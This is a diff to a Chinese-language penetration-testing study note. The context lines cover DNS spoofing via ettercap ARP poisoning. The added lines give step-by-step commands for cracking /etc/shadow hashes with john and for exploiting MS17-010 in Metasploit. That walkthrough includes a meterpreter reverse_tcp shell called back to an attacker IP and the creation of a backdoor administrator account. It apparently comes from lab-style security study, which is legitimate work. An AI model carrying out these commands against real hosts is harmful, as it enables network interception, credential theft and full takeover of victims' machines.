@@ -281,7 +281,7 @@ __主要类型:__<br>
 当你在浏览器中输入网址访问的时候，要先对该域名发给DNS 服务器进行解析， DNSD服务器的地址是外网IP,网络数据要先通过网关，如果把攻击的MAC伪装成网关的MAC
 
 <BR>
-局域网内本来要发给网关的数据发给了攻击者，攻击者就可以读这些数据进行截获，被攻击者访问域名的时候，攻击者截获请求并解析成自己的IP，配置好自己伪造的页面，被攻击者打开的就是伪造过的页面
+局域网内本来要发给网关的数据发给了攻击者，攻击者就可以读这些数据进行截获，被攻击者访问域名的时候，攻击者截获请求并解析成自己的IP，配置好自己伪造的页面，被攻击者打开的就是伪造过的页面 
 </B>
 
 
@@ -304,19 +304,130 @@ leafpad /etc/ettercap/etter.dns
         <img src="picture/qt/DNS劫持演示1.png">
 </figure>
 
-#### <font color = #008080>2.在终端中输入Ettecap -G打开工具</font>
+#### <font color = #D02090>2.在终端中输入Ettecap -G打开工具</font>
 ```ettercap
 ettercap -G
 ```
 
-#### <font color = #008080>2.点击Sniff--Unified sniffing选择eth0网卡</font>
-#### <font color = #008080>3.点击Hosts---Sacn for hosts去扫描其他主机</font>
-#### <font color = #008080>4.扫描结束后，点击Hosts---Hosts list查看扫描结果</font>
-#### <font color = #008080>5.将攻击机的Ip地址选中 ---点击Add Target 1 <BR>  将目标地址选中---点击Add Target 2 </font>
+#### <font color = #D02090>2.点击Sniff--Unified sniffing选择eth0网卡</font>
+#### <font color = #D02090>3.点击Hosts---Sacn for hosts去扫描其他主机</font>
+#### <font color = #D02090>4.扫描结束后，点击Hosts---Hosts list查看扫描结果</font>
+#### <font color = #D02090>5.将攻击机的Ip地址选中 ---点击Add Target 1 <BR>  将目标地址选中---点击Add Target 2 </font>
 
-#### <font color = #008080>6.点击Mitm---ARP poisoning ---弹出的两个选项勾选上，开始ARP欺骗</font>
+#### <font color = #D02090>6.点击Mitm---ARP poisoning ---弹出的两个选项勾选上，开始ARP欺骗</font>
 
-#### <font color = #008080>7.Plugins---Manage the plugins（管理我们的模块），在众多模块中选择 dns_spoof并双击，左侧出现*号就代表正在使用该模块了</font>
-#### <font color = #008080>8.点击Start----Start sniffinf开始攻击</font>
+#### <font color = #D02090>7.Plugins---Manage the plugins（管理我们的模块），在众多模块中选择 dns_spoof并双击，左侧出现*号就代表正在使用该模块了</font>
+#### <font color = #D02090>8.点击Start----Start sniffinf开始攻击</font>
 
-#### <font color = #008080>9.打开目标机器会发现攻击成功了</font>
+#### <font color = #D02090>9.打开目标机器会发现攻击成功了</font>
+
+
+## <font color = #1E90FF>john哈希破解</font>
+### <font color = #FF0000>演示:</font>
+
+#### 1.将kali里面用户和密码所存储的文件组合成一个文件
+```
+unshadow /etc/passwd /etc/shadow >test.txt
+```
+
+#### 2.破解密码
+```
+john test.txt
+```
+
+## <font color = #1E90FF>ms-17010漏洞</font>
+### <font color = #FF0000>演示:((假设目标开启了445端口))</font>
+
+#### <font color = #D02090>1.打开终端启动MSF</font>
+```
+msfconsole
+```
+
+#### <font color = #D02090>2.首先搜索MS17-010</font>
+- **2.1指定第一个模块(辅助模块)auxiliary模块下**
+```
+search ms-17-010        #搜索MS17-010
+use 1   #指定第一个模块
+```
+
+</figure>
+     <figure class="thumbnails">
+        <img src="picture/qt/MS17-010演示.png">
+</figure>
+
+- **2.2查看模块信息并查看必填项**
+```
+info
+```
+
+- **2.3配置对方的IP地址**
+```
+set rhosts 192.168.2.207
+```
+
+- **2.4运行(如果检测出对面有这个漏洞，前面会出现绿色的加号)**
+```
+run 
+或
+exploit
+```
+
+#### <font color = #D02090>3. 搜索MS17-010，并指定执行模块(exploit目录下)</font>
+```
+search ms-17-010        #搜索MS17-010
+use 3   #指定第一个模块
+```
+
+- **3.1查看模块信息并查看必填项**
+```
+info
+```
+
+- **3.2配置对方的IP地址**
+```
+set rhosts 192.168.2.207
+```
+
+- **3.3设立payload使kali能够接收到反弹shell，从而控制目标**
+```
+set payload windows/x64/meterpreter/reverse_tcp
+```
+
+- **3.4 查看这个payload需要配置哪些项**
+```
+ show options
+```
+
+- **3.4 配置攻击机的IP地址**
+```
+set lhost 192.168.2.102
+```
+
+- **3.5 发起攻击**
+```
+run 
+```
+
+#### <font color = #D02090>4. 攻击成功拿到反弹shell</font>
+
+- **4.1查看当前shell的权限**
+```
+getuid
+```
+
+- **4.2进入目标cmd命令行**
+```
+shell
+```
+
+- **4.3新建账户**
+```
+net user test1 123456 /add
+```
+
+- **4.4添加管理员组**
+```
+net localgroup administrators test1 /add
+```
+
+## <font color = #1E90FF>网站目录扫描</font>
